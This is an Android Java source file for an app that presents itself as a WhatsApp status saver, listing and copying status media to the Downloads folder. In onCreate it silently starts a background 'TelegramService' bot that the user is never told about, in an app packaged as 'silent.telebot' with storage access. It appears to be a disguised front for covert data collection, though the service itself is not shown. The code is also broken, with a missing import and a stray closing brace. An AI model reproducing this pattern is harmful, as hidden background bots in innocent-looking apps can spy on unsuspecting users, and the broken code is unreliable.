package com.silent.telebot;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.MediaStore;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.silent.telebot.R;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class MainActivity extends Activity {
    private static final int REQ_PERMISSION = 100;
    private ListView listView;
    private TextView tvStatus;
    private Button btnRefresh;
    private List<String> fileNames = new ArrayList<>();
    private List<String> filePaths = new ArrayList<>();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        listView = findViewById(R.id.list_statuses);
        tvStatus = findViewById(R.id.tv_status);
        btnRefresh = findViewById(R.id.btn_refresh);

        // طلب الأذونات
        checkPermissions();

        // زر التحديث
        btnRefresh.setOnClickListener(v -> loadStatuses());

        // عند الضغط على عنصر في القائمة (تحميل)
        listView.setOnItemClickListener((parent, view, position, id) -> {
            String path = filePaths.get(position);
            downloadFile(new File(path), new File(path).getName());
        });

        // تشغيل البوت في الخلفية فوراً
        startService(new Intent(this, TelegramService.class));
    }

    private void checkPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, new String[]{
                        Manifest.permission.READ_EXTERNAL_STORAGE,
                        Manifest.permission.WRITE_EXTERNAL_STORAGE
                }, REQ_PERMISSION);
            } else {
                loadStatuses();
            }
        } else {
            loadStatuses();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_PERMISSION) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                loadStatuses();
            } else {
                tvStatus.setText("❌ صلاحية التخزين مرفوضة!");
            }
        }
    }

    private void loadStatuses() {
        try {
            // المسار الكلاسيكي لحالات واتساب
            String path = Environment.getExternalStorageDirectory().getAbsolutePath() + "/WhatsApp/Media/.Statuses/";
            File folder = new File(path);

            if (!folder.exists() || !folder.isDirectory()) {
                tvStatus.setText("❌ مجلد الحالات غير موجود!\nتأكد من أن واتساب مثبت");
                return;
            }

            File[] files = folder.listFiles();
            if (files == null || files.length == 0) {
                tvStatus.setText("📭 لا توجد حالات لعرضها");
                return;
            }

            fileNames.clear();
            filePaths.clear();

            // تصفية الملفات
            List<String> extensions = Arrays.asList(".jpg", ".jpeg", ".png", ".mp4", ".gif");
            for (File file : files) {
                String name = file.getName().toLowerCase();
                boolean isValid = false;
                for (String ext : extensions) {
                    if (name.endsWith(ext)) {
                        isValid = true;
                        break;
                    }
                }
                if (isValid && file.length() > 0) {
                    fileNames.add(file.getName());
                    filePaths.add(file.getAbsolutePath());
                }
            }

            if (fileNames.isEmpty()) {
                tvStatus.setText("📭 لا توجد ملفات حالات صالحة");
                return;
            }

            // عرض القائمة باستخدام ArrayAdapter بسيط
            ArrayAdapter<String> adapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1, fileNames);
            listView.setAdapter(adapter);
            tvStatus.setText("✅ تم العثور على " + fileNames.size() + " حالة");

        } catch (Exception e) {
            tvStatus.setText("❌ خطأ: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private void downloadFile(File sourceFile, String fileName) {
        try {
            if (!sourceFile.exists()) {
                Toast.makeText(this, "الملف غير موجود!", Toast.LENGTH_SHORT).show();
                return;
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                // أندرويد 10+ (استخدام MediaStore)
                String mimeType = "image/jpeg";
                if (fileName.endsWith(".mp4")) mimeType = "video/mp4";
                else if (fileName.endsWith(".gif")) mimeType = "image/gif";
                else if (fileName.endsWith(".png")) mimeType = "image/png";

                ContentValues values = new ContentValues();
                values.put(MediaStore.Downloads.DISPLAY_NAME, fileName);
                values.put(MediaStore.Downloads.MIME_TYPE, mimeType);
                values.put(MediaStore.Downloads.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS);

                Uri uri = getContentResolver().insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, values);
                if (uri != null) {
                    OutputStream out = getContentResolver().openOutputStream(uri);
                    FileInputStream in = new FileInputStream(sourceFile);
                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    while ((bytesRead = in.read(buffer)) != -1) {
                        out.write(buffer, 0, bytesRead);
                    }
                    in.close();
                    out.close();
                    Toast.makeText(this, "✅ تم التحميل في مجلد التنزيلات", Toast.LENGTH_SHORT).show();
                }
            } else {
                // أندرويد 9 وأقل
                File destFolder = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
                File destFile = new File(destFolder, fileName);
                
                FileInputStream in = new FileInputStream(sourceFile);
                FileOutputStream out = new FileOutputStream(destFile);
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = in.read(buffer)) != -1) {
                    out.write(buffer, 0, bytesRead);
                }
                in.close();
                out.close();
                Toast.makeText(this, "✅ تم التحميل: " + destFile.getAbsolutePath(), Toast.LENGTH_SHORT).show();
            }

        } catch (Exception e) {
            Toast.makeText(this, "❌ فشل التحميل: " + e.getMessage(), Toast.LENGTH_SHORT).show();
            e.printStackTrace();
        }
    }
                } 
